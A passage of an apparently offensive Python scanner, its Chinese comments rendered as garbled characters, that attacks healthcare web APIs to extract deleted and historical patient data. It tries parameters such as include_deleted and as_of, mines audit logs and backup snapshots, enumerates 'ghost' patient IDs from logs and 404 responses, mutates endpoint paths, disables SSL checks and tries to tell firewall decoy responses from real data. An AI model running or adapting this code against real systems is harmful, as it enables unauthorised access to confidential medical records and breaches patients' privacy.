                for time_point in time_points:
                    # å°è¯•ä¸åŒçš„æ—¶é—´æ ¼å¼
                    for format_name, format_func in self.time_formats.items():
                        time_value = format_func(time_point)
                        
                        # æ„é€ æŸ¥è¯¢URL
                        if 'as_of' in endpoint['pattern']:
                            test_url = f"{base_url}?as_of={time_value}"
                        elif 'at=' in endpoint['pattern']:
                            test_url = f"{base_url}?at={time_value}"
                        elif 'date=' in endpoint['pattern']:
                            test_url = f"{base_url}?date={time_value}"
                        elif 'time=' in endpoint['pattern']:
                            test_url = f"{base_url}?time={time_value}"
                        elif 'snapshot=' in endpoint['pattern']:
                            test_url = f"{base_url}?snapshot={time_value}"
                        else:
                            test_url = f"{base_url}?point_in_time={time_value}"
                            
                        try:
                            async with session.get(test_url, timeout=10) as resp:
                                if resp.status == 200:
                                    data = await resp.json()
                                    
                                    if data and (isinstance(data, list) and len(data) > 0) or (isinstance(data, dict) and len(data) > 1):
                                        record_count = len(data) if isinstance(data, list) else 1
                                        
                                        print(f"[!] {time_point.strftime('%Y-%m-%d')}: {record_count} æ¡è®°å½•")
                                        
                                        historical_records.append({
                                            'time_point': time_point.isoformat(),
                                            'format': format_name,
                                            'record_count': record_count,
                                            'sample_data': data[:5] if isinstance(data, list) else data
                                        })
                                        
                                        break  # æˆåŠŸå°±è·³å‡ºæ ¼å¼å¾ªç¯
                                        
                        except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                        
                            logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
                if historical_records:
                    print(f"[!] æˆåŠŸè·å– {len(historical_records)} ä¸ªæ—¶é—´ç‚¹çš„æ•°æ®")
                    
                    self.historical_data.append({
                        'type': 'point_in_time',
                        'resource': endpoint['resource'],
                        'time_points': historical_records,
                        'total_records': sum(r['record_count'] for r in historical_records)
                    })

    async def get_audit_logs(self):
        """è·å–å®¡è®¡æ—¥å¿—"""
        print("\n[+] è·å–å®¡è®¡æ—¥å¿—...")
        
        audit_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'audit_log']
        
        if not audit_endpoints:
            print("[-] æœªå‘ç°å®¡è®¡æ—¥å¿—ç«¯ç‚¹")
            return
            
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for endpoint in audit_endpoints[:5]:
                try:
                    # è·å–å®¡è®¡æ—¥å¿—
                    url = endpoint['url']
                    
                    # æ·»åŠ å‚æ•°è·å–æ›´å¤šæ—¥å¿—
                    if '?' not in url:
                        url += '?'
                    else:
                        url += '&'
                    
                    # è·å–æ™ºèƒ½é™åˆ¶
                    api_limit = self.limit_manager.get_api_limit(self.system_size, 'historical')
                    url += f'limit={api_limit}&size={api_limit}&count={api_limit}'
                    
                    async with session.get(url, timeout=30) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if isinstance(data, list) and len(data) > 0:
                                print(f"[!] è·å– {len(data)} æ¡å®¡è®¡æ—¥å¿—")
                                
                                # åˆ†ææ—¥å¿—
                                sensitive_logs = []
                                
                                for log in data:
                                    if isinstance(log, dict):
                                        # æ£€æŸ¥æ˜¯å¦åŒ…å«æ•æ„Ÿæ“ä½œ
                                        action = log.get('action', log.get('event', log.get('type', '')))
                                        
                                        if any(keyword in str(action).lower() for keyword in ['delete', 'remove', 'update', 'create', 'export', 'download']):
                                            sensitive_logs.append(log)
                                            
                                            # æ£€æŸ¥æ˜¯å¦åŒ…å«æ•°æ®
                                            if 'data' in log or 'changes' in log or 'before' in log or 'after' in log:
                                                print(f"    [!] æ•æ„Ÿæ“ä½œ: {action}")
                                                
                                                # æå–å†å²æ•°æ®
                                                if 'before' in log:
                                                    self.historical_data.append({
                                                        'type': 'audit_before_data',
                                                        'resource': endpoint['resource'],
                                                        'action': action,
                                                        'data': log['before'],
                                                        'timestamp': log.get('timestamp', log.get('created_at', ''))
                                                    })
                                                    
                                if sensitive_logs:
                                    print(f"[!] å‘ç° {len(sensitive_logs)} æ¡æ•æ„Ÿæ“ä½œæ—¥å¿—")
                                    
                                    self.historical_data.append({
                                        'type': 'audit_logs',
                                        'resource': endpoint['resource'],
                                        'logs': sensitive_logs[:50],  # ä¿å­˜å‰50æ¡
                                        'total_logs': len(sensitive_logs)
                                    })
                                    
                except Exception as e:
                    pass

    async def find_deleted_data(self):
        """æŸ¥æ‰¾å·²åˆ é™¤æ•°æ®"""
        print("\n[+] æŸ¥æ‰¾å·²åˆ é™¤æ•°æ®...")
        
        deleted_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'deleted_data']
        
        # å¦‚æœæ²¡æœ‰ä¸“é—¨çš„åˆ é™¤æ•°æ®ç«¯ç‚¹ï¼Œå°è¯•åœ¨æ™®é€šç«¯ç‚¹æ·»åŠ å‚æ•°
        if not deleted_endpoints:
            print("[+] å°è¯•é€šè¿‡å‚æ•°æŸ¥æ‰¾å·²åˆ é™¤æ•°æ®...")
            
            # ä½¿ç”¨å…¶ä»–ç«¯ç‚¹å°è¯•
            for resource in self.medical_resources[:5]:
                base_url = urljoin(self.target_url, f'/api/{resource}')
                
                deleted_endpoints.append({
                    'url': base_url,
                    'resource': resource,
                    'type': 'deleted_data'
                })
                
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for endpoint in deleted_endpoints[:10]:
                print(f"\n[+] æŸ¥æ‰¾å·²åˆ é™¤çš„: {endpoint['resource']}")
                
                base_url = endpoint['url'].split('?')[0]
                
                # å°è¯•å„ç§å‚æ•°ç»„åˆ
                deleted_params = [
                    'include_deleted=true',
                    'show_deleted=true',
                    'with_deleted=true',
                    'deleted=true',
                    'deleted=1',
                    'deleted=only',
                    'state=deleted',
                    'status=deleted',
                    'active=false',
                    'active=0',
                    'is_deleted=true',
                    'is_active=false',
                    'archived=true',
                    'trashed=true'
                ]
                
                for param in deleted_params:
                    test_url = f"{base_url}?{param}"
                    
                    try:
                        async with session.get(test_url, timeout=10) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                
                                if isinstance(data, list) and len(data) > 0:
                                    # æ£€æŸ¥æ˜¯å¦çœŸçš„æ˜¯å·²åˆ é™¤æ•°æ®
                                    deleted_count = 0
                                    
                                    for item in data:
                                        if isinstance(item, dict):
                                            # æ£€æŸ¥åˆ é™¤æ ‡è®°
                                            if any(item.get(field) for field in ['deleted', 'is_deleted', 'deleted_at', 'trashed_at']):
                                                deleted_count += 1
                                                
                                    if deleted_count > 0:
                                        print(f"[!] å‘ç° {deleted_count} æ¡å·²åˆ é™¤è®°å½•!")
                                        
                                        self.deleted_records.extend(data[:20])  # ä¿å­˜å‰20æ¡
                                        
                                        self.historical_data.append({
                                            'type': 'deleted_data',
                                            'resource': endpoint['resource'],
                                            'deleted_count': deleted_count,
                                            'parameter': param,
                                            'sample_data': data[:10]
                                        })
                                        
                                        break
                                        
                                elif isinstance(data, dict) and 'data' in data:
                                    # åˆ†é¡µæ ¼å¼
                                    items = data['data']
                                    if isinstance(items, list) and len(items) > 0:
                                        deleted_count = sum(1 for item in items if isinstance(item, dict) and any(item.get(f) for f in ['deleted', 'is_deleted']))
                                        
                                        if deleted_count > 0:
                                            print(f"[!] å‘ç° {deleted_count} æ¡å·²åˆ é™¤è®°å½•!")
                                            
                                            self.historical_data.append({
                                                'type': 'deleted_data',
                                                'resource': endpoint['resource'],
                                                'deleted_count': deleted_count,
                                                'parameter': param,
                                                'sample_data': items[:10]
                                            })
                                            
                                            break
                                            
                    except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                            
                        logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
    async def get_historical_snapshots(self):
        """è·å–å†å²å¿«ç…§"""
        print("\n[+] è·å–å†å²å¿«ç…§...")
        
        snapshot_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'snapshot']
        
        if not snapshot_endpoints:
            # å°è¯•å¸¸è§çš„å¿«ç…§ç«¯ç‚¹
            snapshot_paths = [
                '/api/snapshots',
                '/api/backups',
                '/api/data-snapshots',
                '/admin/snapshots',
                '/system/snapshots'
            ]
            
            #  ä¿®å¤ï¼šä½¿ç”¨çœŸæ­£çš„å¹¶å‘æ‰§è¡Œï¼Œé¿å…ä¸²è¡Œç­‰å¾…
            async with aiohttp.ClientSession() as session:
                # åˆ›å»ºå¹¶å‘ä»»åŠ¡
                async def check_snapshot_path(path):
                    url = urljoin(self.target_url, path)
                    try:
                        async with session.get(url, timeout=10) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if data:
                                    return {
                                        'url': url,
                                        'type': 'snapshot',
                                        'data': data
                                    }
                    except Exception as e:
                        logging.warning(f"å¿«ç…§ç«¯ç‚¹æ£€æµ‹å¤±è´¥ {url}: {type(e).__name__}")
                    return None
                                    
                # å¹¶å‘æ‰§è¡Œæ‰€æœ‰æ£€æµ‹ä»»åŠ¡
                tasks = [check_snapshot_path(path) for path in snapshot_paths]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                                    
                # æ”¶é›†æœ‰æ•ˆç»“æœ
                for result in results:
                    if result and isinstance(result, dict):
                        snapshot_endpoints.append(result)
        if snapshot_endpoints:
            print(f"[!] å‘ç° {len(snapshot_endpoints)} ä¸ªå¿«ç…§ç«¯ç‚¹")
            
            # åˆ†æå¿«ç…§
            for endpoint in snapshot_endpoints:
                data = endpoint.get('data', endpoint.get('sample_data', []))
                
                if isinstance(data, list):
                    print(f"[+] åˆ†æ {len(data)} ä¸ªå¿«ç…§")
                    
                    medical_snapshots = []
                    
                    for snapshot in data:
                        if isinstance(snapshot, dict):
                            # æ£€æŸ¥æ˜¯å¦åŒ…å«åŒ»ç–—æ•°æ®
                            name = snapshot.get('name', snapshot.get('filename', ''))
                            date = snapshot.get('date', snapshot.get('created_at', ''))
                            
                            if any(keyword in str(name).lower() for keyword in ['patient', 'medical', 'backup', 'full']):
                                medical_snapshots.append(snapshot)
                                
                                print(f"    [!] åŒ»ç–—å¿«ç…§: {name} ({date})")
                                
                    if medical_snapshots:
                        self.historical_data.append({
                            'type': 'snapshots',
                            'snapshots': medical_snapshots,
                            'total': len(medical_snapshots)
                        })

    async def analyze_change_records(self):
        """åˆ†æå˜æ›´è®°å½•"""
        print("\n[+] åˆ†æå˜æ›´è®°å½•...")
        
        change_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'change_tracking']
        
        if not change_endpoints:
            print("[-] æœªå‘ç°å˜æ›´è¿½è¸ªç«¯ç‚¹")
            return
            
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for endpoint in change_endpoints[:5]:
                try:
                    url = endpoint['url']
                    
                    async with session.get(url, timeout=10) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            if isinstance(data, list) and len(data) > 0:
                                print(f"[!] è·å– {len(data)} æ¡å˜æ›´è®°å½•")
                                
                                # åˆ†æå˜æ›´
                                significant_changes = []
                                
                                for change in data:
                                    if isinstance(change, dict):
                                        # æ£€æŸ¥æ˜¯å¦åŒ…å«å‰åæ•°æ®
                                        if 'before' in change and 'after' in change:
                                            significant_changes.append(change)
                                            
                                        # æˆ–è€…åŒ…å«å·®å¼‚
                                        elif 'diff' in change or 'changes' in change or 'delta' in change:
                                            significant_changes.append(change)
                                            
                                if significant_changes:
                                    print(f"[!] å‘ç° {len(significant_changes)} æ¡é‡è¦å˜æ›´")
                                    
                                    self.historical_data.append({
                                        'type': 'change_records',
                                        'resource': endpoint['resource'],
                                        'changes': significant_changes[:20],
                                        'total_changes': len(significant_changes)
                                    })
                                    
                except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                    
                    logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")

    # ===============  æ–°å¢ä¼˜åŒ–æ–¹æ³• ===============
    
    def _generate_optimized_ghost_tasks(self) -> List[RequestTask]:
        """ ç”Ÿæˆä¼˜åŒ–çš„å¹½çµIDä»»åŠ¡ - é¿å…O(nÂ³)å¤æ‚åº¦"""
        tasks = []
        
        #  ä¼˜åŒ–1ï¼šé¢„è®¡ç®—é«˜ä»·å€¼ç»„åˆï¼Œé¿å…åµŒå¥—å¾ªç¯
        high_value_resources = [
            ('/api/patient/{id}', 1.0),
            ('/api/patients/{id}', 0.95),
            ('/api/prescription/{id}', 0.9),
            ('/api/record/{id}', 0.85),
        ]
        
        high_value_time_params = [
            ('?as_of=2020-01-01', 1.0),
            ('?include_deleted=true', 0.95),  
            ('?show_deleted=true', 0.9),
            ('?at=2020-01-01', 0.8),
        ]
        
        #  ä¼˜åŒ–2ï¼šåªå¤„ç†é«˜ä¼˜å…ˆçº§çš„ID
        sorted_ghost_ids = self._prioritize_ghost_ids()
        
        #  ä¼˜åŒ–3ï¼šæ™ºèƒ½ç»„åˆç”Ÿæˆ - é¿å…ä½ä»·å€¼ç»„åˆ
        for ghost_id, id_priority in sorted_ghost_ids[:self.config.MAX_GHOST_IDS_PROCESS]:  # ä½¿ç”¨é…ç½®çš„IDæ•°é‡é™åˆ¶
            for resource_pattern, resource_priority in high_value_resources:
                for time_pattern, time_priority in high_value_time_params:
                    
                    #    ä¼˜åŒ–4ï¼šä¼˜å…ˆçº§å½’ä¸€åŒ–è®¡ç®—ï¼Œé¿å…è¿‡å°å€¼
                    combined_priority = (id_priority + resource_priority + time_priority) / 3
                    
                    # åªä¿ç•™é«˜ä»·å€¼ç»„åˆï¼ˆå½’ä¸€åŒ–åé˜ˆå€¼è°ƒæ•´ï¼‰
                    if combined_priority >= self.config.PRIORITY_THRESHOLD:
                        url = urljoin(self.target_url, resource_pattern.replace('{id}', ghost_id) + time_pattern)
                        
                        task = RequestTask(
                            priority=combined_priority,
                            url=url,
                            task_type='ghost_injection',
                            metadata={
                                'ghost_id': ghost_id,
                                'resource_pattern': resource_pattern,
                                'time_pattern': time_pattern
                            }
                        )
                        
                        tasks.append(task)
        
        #  ä¼˜åŒ–5ï¼šæŒ‰ä¼˜å…ˆçº§æ’åºï¼Œç¡®ä¿é«˜ä»·å€¼ä»»åŠ¡ä¼˜å…ˆæ‰§è¡Œ
        tasks.sort(key=lambda t: t.priority, reverse=True)
        
        return tasks[:self.config.MAX_TASKS_GENERATE]  # ä½¿ç”¨é…ç½®çš„æœ€å¤§ä»»åŠ¡æ•°é™åˆ¶
    
    def _prioritize_ghost_ids(self) -> List[Tuple[str, float]]:
        """ æ™ºèƒ½IDä¼˜å…ˆçº§æ’åº"""
        id_priorities = []
        
        for ghost_id in self.ghost_ids:
            priority = self._calculate_ghost_id_priority(ghost_id)
            id_priorities.append((ghost_id, priority))
        
        return sorted(id_priorities, key=lambda x: x[1], reverse=True)
    
    def _calculate_ghost_id_priority(self, ghost_id: str) -> float:
        """ è®¡ç®—å•ä¸ªå¹½çµIDçš„ä¼˜å…ˆçº§"""
        try:
            # æ•°å­—IDï¼šè¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ï¼ˆæ—©æœŸæ•°æ®æ›´æœ‰ä»·å€¼ï¼‰
            if ghost_id.isdigit():
                num_id = int(ghost_id)
                if num_id < 100:
                    return 1.0  # å‰100ä¸ªIDæœ€é«˜ä¼˜å…ˆçº§
                elif num_id < 1000:
                    return 0.8
                elif num_id < 10000:
                    return 0.6
                else:
                    return 0.4
            
            # åŒ»ç–—å‰ç¼€IDï¼šé«˜ä¼˜å…ˆçº§
            elif ghost_id.startswith(('P', 'PAT', 'MR', 'RX')):
                return 0.9
            
            # å…¶ä»–æ ¼å¼ID
            else:
                return 0.5
                
        except:
            return 0.3
    
    async def _validate_response_with_waf_simple(self, result: Dict) -> bool:
        """ ç®€åŒ–çš„WAFéªŒè¯ï¼ˆé¿å…é‡å¤WAFè°ƒç”¨ï¼‰"""
        if not self.waf_defender:
            return True
            
        try:
            # ç®€å•éªŒè¯ï¼šæ£€æŸ¥å“åº”å¤§å°å’Œå†…å®¹ç±»å‹
            if result.get('status') != 200:
                return False
                
            data = result.get('data')
            if not data:
                return False
                
            # æ£€æŸ¥æ˜¯å¦ä¸ºæœ‰æ•ˆçš„JSONæ•°æ®
            if isinstance(data, dict):
                # æ£€æŸ¥æ˜¯å¦æœ‰å®é™…å†…å®¹
                if len(data) == 0:
                    return False
                    
                # æ£€æŸ¥æ˜¯å¦ä¸ºWAFæ¬ºéª—å“åº”çš„å¸¸è§æ¨¡å¼
                if 'error' in data or 'denied' in str(data).lower():
                    return False
                    
            return True
            
        except Exception:
            return True  # éªŒè¯å¼‚å¸¸æ—¶ä¿å®ˆå¤„ç†
    
    def _enhanced_id_inference(self, result: Dict) -> None:
        """ å¢å¼ºIDæ¨æ–­ç®—æ³•"""
        try:
            # ä»å“åº”å¤´æå–ID
            headers = result.get('headers', {})
            self._extract_ids_from_headers(headers, result['task'].url)
            
            # ä»JSONå“åº”æå–ID
            data = result.get('data')
            if data:
                new_ids = self._extract_ids_from_json_optimized(data)
                self.ghost_ids.update(new_ids)  # ä½¿ç”¨setçš„updateæ–¹æ³•
                
                #   å®‰å…¨ç¼“å­˜URLå¯¹åº”çš„ID - é˜²æ­¢å†…å­˜æ³„æ¼
                self._safe_cache_ids(result['task'].url, new_ids)
                
        except (KeyError, TypeError, AttributeError) as e:
            self._log_error('id_inference_error', f"IDæ¨æ–­æ•°æ®ç»“æ„é”™è¯¯: {e}")
        except json.JSONDecodeError as e:
            self._log_error('id_inference_error', f"IDæ¨æ–­JSONè§£æé”™è¯¯: {e}")
        except Exception as e:
            self._log_error('id_inference_error', f"IDæ¨æ–­æœªçŸ¥é”™è¯¯: {e}")
    
    def _extract_ids_from_headers(self, headers: Dict[str, str], url: str) -> None:
        """ä»å“åº”å¤´æå–ID"""
        header_patterns = [
            'Location', 'X-Resource-ID', 'X-Patient-ID', 'X-Record-ID'
        ]
        
        for header_name in header_patterns:
            header_value = headers.get(header_name, '')
            if header_value:
                # æå–æ•°å­—ID
                import re
                id_matches = re.findall(r'/(\d+)(?:/|$|\?)', header_value)
                self.ghost_ids.update(id_matches)
    
    def _extract_ids_from_json_optimized(self, data: Any, max_depth: int = 2) -> Set[str]:
        """ ä¼˜åŒ–çš„JSON IDæå–ç®—æ³•"""
        extracted_ids = set()
        
        def extract_recursive(obj, depth):
            if depth > max_depth:
                return
                
            if isinstance(obj, dict):
                # ä¼˜å…ˆæŸ¥æ‰¾IDå­—æ®µ
                for key in ['id', '_id', 'ID', 'patient_id', 'user_id', 'record_id']:
                    if key in obj and obj[key]:
                        extracted_ids.add(str(obj[key]))
                
                # é€’å½’å¤„ç†å€¼ï¼ˆé™åˆ¶æ·±åº¦ï¼‰
                for value in list(obj.values())[:10]:  # é™åˆ¶å¤„ç†æ•°é‡
                    if isinstance(value, (dict, list)):
                        extract_recursive(value, depth + 1)
                        
            elif isinstance(obj, list):
                for item in obj[:5]:  # åªå¤„ç†å‰5ä¸ªå…ƒç´ 
                    if isinstance(item, (dict, list)):
                        extract_recursive(item, depth + 1)
        
        extract_recursive(data, 0)
        return extracted_ids
    
    def _learn_time_format_from_response(self, url: str, time_format: str, success: bool) -> None:
        """ ä»æœåŠ¡å™¨å“åº”ä¸­å­¦ä¹ æ—¶é—´æ ¼å¼"""
        if time_format not in self.learned_time_formats:
            self.learned_time_formats[time_format] = 0.0
            
        # æ›´æ–°æˆåŠŸç‡
        current_rate = self.learned_time_formats[time_format]
        if success:
            self.learned_time_formats[time_format] = min(1.0, current_rate + 0.1)
        else:
            self.learned_time_formats[time_format] = max(0.0, current_rate - 0.05)
    
    def _get_preferred_time_formats(self) -> List[str]:
        """ è·å–ä¼˜å…ˆçš„æ—¶é—´æ ¼å¼ï¼ˆåŸºäºå­¦ä¹ ç»“æœï¼‰"""
        if not self.learned_time_formats:
            # é»˜è®¤é«˜ä»·å€¼æ ¼å¼
            return ['iso', 'iso_z', 'date', 'unix']
            
        # æŒ‰æˆåŠŸç‡æ’åº
        sorted_formats = sorted(
            self.learned_time_formats.items(),
            key=lambda x: x[1],
            reverse=True
        )
        
        return [fmt for fmt, rate in sorted_formats if rate > 0.3][:4]  # åªè¿”å›å‰4ä¸ªé«˜æˆåŠŸç‡æ ¼å¼
    
    def _safe_add_tested_combination(self, combination_key: str) -> bool:
        """  å®‰å…¨åœ°æ·»åŠ å·²æµ‹è¯•ç»„åˆ - é˜²æ­¢å†…å­˜æ³„æ¼"""
        if combination_key in self.tested_combinations_set:
            return False  # å·²ç»æµ‹è¯•è¿‡
        
        # æ·»åŠ åˆ°dequeï¼ˆè‡ªåŠ¨å¤„ç†æº¢å‡ºï¼‰
        if len(self.tested_combinations) >= self.config.DEFAULT_TESTED_COMBINATIONS_LIMIT:
            # dequeæ»¡äº†ï¼Œéœ€è¦ä»setä¸­ç§»é™¤æœ€æ—§çš„å…ƒç´ 
            oldest = self.tested_combinations[0] if self.tested_combinations else None
            if oldest and oldest in self.tested_combinations_set:
                self.tested_combinations_set.remove(oldest)
        
        self.tested_combinations.append(combination_key)
        self.tested_combinations_set.add(combination_key)
        return True  # æ–°æ·»åŠ çš„ç»„åˆ
    
    def _safe_cache_ids(self, url: str, ids: Set[str]) -> None:
        """  å®‰å…¨åœ°ç¼“å­˜IDæ¨æ–­ç»“æœ - ä½¿ç”¨LRUç¼“å­˜"""
        if ids:
            existing_ids = self.id_inference_cache.get(url, set())
            
            #   è®°å½•ç¼“å­˜è®¿é—®
            cache_hit = existing_ids is not None
            self.performance_metrics.record_cache_access(cache_hit)
            
            if isinstance(existing_ids, set):
                existing_ids.update(ids)
            else:
                existing_ids = ids
            self.id_inference_cache.set(url, existing_ids)
    
    def _analyze_data_records(self) -> Dict[str, Any]:
        """ åˆ†æç»Ÿä¸€æ•°æ®è®°å½•ç»Ÿè®¡"""
        record_types = defaultdict(int)
        source_domains = defaultdict(int) 
        time_distribution = defaultdict(int)
        
        for record in self.data_records:
            record_types[record.record_type] += 1
            
            # åˆ†ææºåŸŸå
            try:
                from urllib.parse import urlparse
                domain = urlparse(record.source_url).netloc
                source_domains[domain] += 1
            except:
                pass
                
            # åˆ†ææ—¶é—´åˆ†å¸ƒ
            try:
                hour = datetime.fromisoformat(record.timestamp.replace('Z', '+00:00')).hour
                time_distribution[f"{hour:02d}:00"] += 1
            except:
                pass
        
        return {
            'by_type': dict(record_types),
            'by_source': dict(source_domains),
            'by_time': dict(time_distribution),
            'total_types': len(record_types),
            'duplicate_prevention_rate': f"{(len(self.memory_manager.data_hashes) / max(1, len(self.data_records))) * 100:.1f}%"
        }
    
    def _calculate_average_priority(self) -> float:
        """ è®¡ç®—å¹³å‡ä¼˜å…ˆçº§åˆ†æ•°"""
        ghost_records = [r for r in self.data_records if r.record_type == 'ghost_injection_success']
        if not ghost_records:
            return 0.0
            
        total_priority = sum(r.metadata.get('priority_score', 0) for r in ghost_records)
        return total_priority / len(ghost_records)

    # =============== P0æ€æ‰‹é”åŠŸèƒ½ ===============
    
    async def ghost_id_discovery(self):
        """P0æ€æ‰‹é”1ï¼šIDå¹½çµæ¢æµ‹ - ä»å®¡è®¡æ—¥å¿—/é”™è¯¯ä¿¡æ¯ä¸­æ”¶é›†å·²åˆ é™¤ID"""
        print("\n[] P0æ€æ‰‹é”ï¼šIDå¹½çµæ¢æµ‹...")
        
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            # å®¡è®¡æ—¥å¿—ç«¯ç‚¹æ¢æµ‹
            audit_endpoints = [
                '/api/audit-log', '/api/audit', '/audit', '/logs',
                '/admin/audit', '/system/audit-log', '/api/activity-log',
                '/api/changelog', '/api/history-log', '/logs/audit'
            ]
            
            # é”™è¯¯ä¿¡æ¯ç«¯ç‚¹æ¢æµ‹
            error_endpoints = [
                '/api/errors', '/errors', '/api/logs/error', '/error-log',
                '/admin/errors', '/system/errors', '/api/debug', '/debug'
            ]
            
            # 404æµ‹è¯•ï¼ˆæ•…æ„è®¿é—®ä¸å­˜åœ¨çš„IDï¼‰
            test_endpoints = [
                '/api/patients/99999', '/api/users/99999', '/api/appointments/99999',
                '/api/prescriptions/99999', '/api/records/99999'
            ]
            
            for endpoint in audit_endpoints + error_endpoints:
                url = urljoin(self.target_url, endpoint)
                try:
                    async with session.get(url, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            # WAFéªŒè¯
                            is_real = await self._validate_response_with_waf(url, resp, 'ghost_discovery')
                            if not is_real:
                                continue
                                
                            if 'json' in resp.headers.get('Content-Type', ''):
                                data = await resp.json()
                                self._extract_ghost_ids_from_logs(data, endpoint)
                                
                except Exception as e:
                    continue
            
            # 404æµ‹è¯•æå–IDæ¨¡å¼
            for endpoint in test_endpoints:
                url = urljoin(self.target_url, endpoint)
                try:
                    async with session.get(url, timeout=5, ssl=False) as resp:
                        if resp.status == 404:
                            # ä»404å“åº”ä¸­æå–IDæ ¼å¼ä¿¡æ¯
                            text = await resp.text()
                            self._extract_id_patterns_from_404(text, endpoint)
                            
                except Exception as e:
                    continue
                    
        print(f"[!] æ”¶é›†åˆ° {len(self.ghost_ids)} ä¸ªå¹½çµID")
        if self.ghost_ids:
            print(f"    æ ·æœ¬: {self.ghost_ids[:5]}")

    def _extract_ghost_ids_from_logs(self, log_data, endpoint):
        """ä»å®¡è®¡æ—¥å¿—ä¸­æå–å·²åˆ é™¤çš„ID"""
        import re
        
        if isinstance(log_data, list):
            for log_entry in log_data:
                if isinstance(log_entry, dict):
                    # æŸ¥æ‰¾åˆ é™¤æ“ä½œ
                    action = str(log_entry.get('action', '')).lower()
                    message = str(log_entry.get('message', '')).lower()
                    
                    if 'delete' in action or 'remove' in action or 'å‰Šé™¤' in action:
                        # æå–ID
                        id_patterns = [
                            r'id[\'\":\s]*(\d+)',
                            r'patient[_\s]*id[\'\":\s]*(\d+)',
                            r'user[_\s]*id[\'\":\s]*(\d+)',
                            r'record[_\s]*id[\'\":\s]*(\d+)',
                            r'[\'\"](/[\w]+/(\d+))[\'\""]',
                            r'P(\d+)', r'PAT(\d+)', r'U(\d+)',  # åŒ»ç–—IDæ ¼å¼
                        ]
                        
                        text = f"{log_entry}"
                        for pattern in id_patterns:
                            matches = re.findall(pattern, text, re.IGNORECASE)
                            for match in matches:
                                if isinstance(match, tuple):
                                    match = match[-1]  # å–æœ€åä¸€ä¸ªç»„
                                if match:
                                    self.ghost_ids.add(match)
        
        elif isinstance(log_data, dict):
            # é€’å½’å¤„ç†åµŒå¥—çš„dict
            for key, value in log_data.items():
                if isinstance(value, (list, dict)):
                    self._extract_ghost_ids_from_logs(value, endpoint)

    def _extract_id_patterns_from_404(self, response_text, endpoint):
        """ä»404å“åº”ä¸­æå–IDæ ¼å¼æ¨¡å¼"""
        import re
        
        # æå–URLä¸­çš„IDæ¨¡å¼
        id_patterns = [
            r'(\d+)',  # çº¯æ•°å­—ID
            r'P(\d+)',  # På‰ç¼€
            r'PAT(\d+)',  # PATå‰ç¼€ 
            r'202[34](\d+)',  # åŸºäºå¹´ä»½çš„ID
        ]
        
        for pattern in id_patterns:
            matches = re.findall(pattern, endpoint)
            for match in matches:
                # ç”Ÿæˆç›¸é‚»çš„IDç”¨äºå¹½çµæ¢æµ‹
                try:
                    base_id = int(match)
                    # ç”Ÿæˆå‰åå„10ä¸ªID
                    for offset in range(-10, 11):
                        ghost_id = base_id + offset
                        if ghost_id > 0:
                            self.ghost_ids.add(str(ghost_id))
                except (ValueError, TypeError) as e:
                    # IDæ ¼å¼æ— æ³•è½¬æ¢ä¸ºæ•´æ•°ï¼Œè·³è¿‡
                    continue
                except Exception as e:
                    self._log_error('ghost_id_generation_error', f"å¹½çµIDç”Ÿæˆé”™è¯¯: {e}")
                    continue

    async def intelligent_endpoint_mutation(self):
        """P0æ€æ‰‹é”2ï¼šç«¯ç‚¹æ™ºèƒ½å˜å¼‚ - ä»ä¸€ä¸ªç«¯ç‚¹è‡ªåŠ¨æ´¾ç”Ÿå†å²å˜ç§"""
        print("\n[] P0æ€æ‰‹é”ï¼šç«¯ç‚¹æ™ºèƒ½å˜å¼‚...")
        
        # ä»å·²å‘ç°çš„ç«¯ç‚¹å¼€å§‹å˜å¼‚
        base_endpoints = [ep['url'] for ep in self.time_travel_endpoints]
        
        # å¦‚æœæ²¡æœ‰å‘ç°ç«¯ç‚¹ï¼Œä½¿ç”¨å¸¸è§çš„APIç«¯ç‚¹
        if not base_endpoints:
            base_endpoints = [
                f"{self.target_url}/api/patients",
                f"{self.target_url}/api/users", 
                f"{self.target_url}/api/appointments"
            ]
        
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for base_url in base_endpoints[:5]:  # é™åˆ¶å¤„ç†æ•°é‡
                await self._mutate_single_endpoint(session, base_url)
        
        print(f"[!] é€šè¿‡å˜å¼‚å‘ç° {len(self.discovered_endpoints)} ä¸ªæ–°ç«¯ç‚¹")

    async def _mutate_single_endpoint(self, session, base_url):
        """å¯¹å•ä¸ªç«¯ç‚¹è¿›è¡Œæ™ºèƒ½å˜å¼‚"""
        from urllib.parse import urlparse, urlunparse
        
        parsed = urlparse(base_url)
        base_path = parsed.path
        
        # å†å²ç«¯ç‚¹å˜å¼‚æ¨¡å¼
        mutations = [
            '/history', '/_history', '/versions', '/audit', '/changelog',
            '/deleted', '/trash', '/archive', '/snapshots', '/backups',
            '?include_history=true', '?include_deleted=true', '?versions=true'
        ]
        
        # APIç‰ˆæœ¬å˜å¼‚
        version_mutations = []
        if '/api/' in base_path:
            for v in range(1, 6):  # v1åˆ°v5
                version_mutations.append(base_path.replace('/api/', f'/api/v{v}/'))
        
        all_mutations = mutations + version_mutations
        
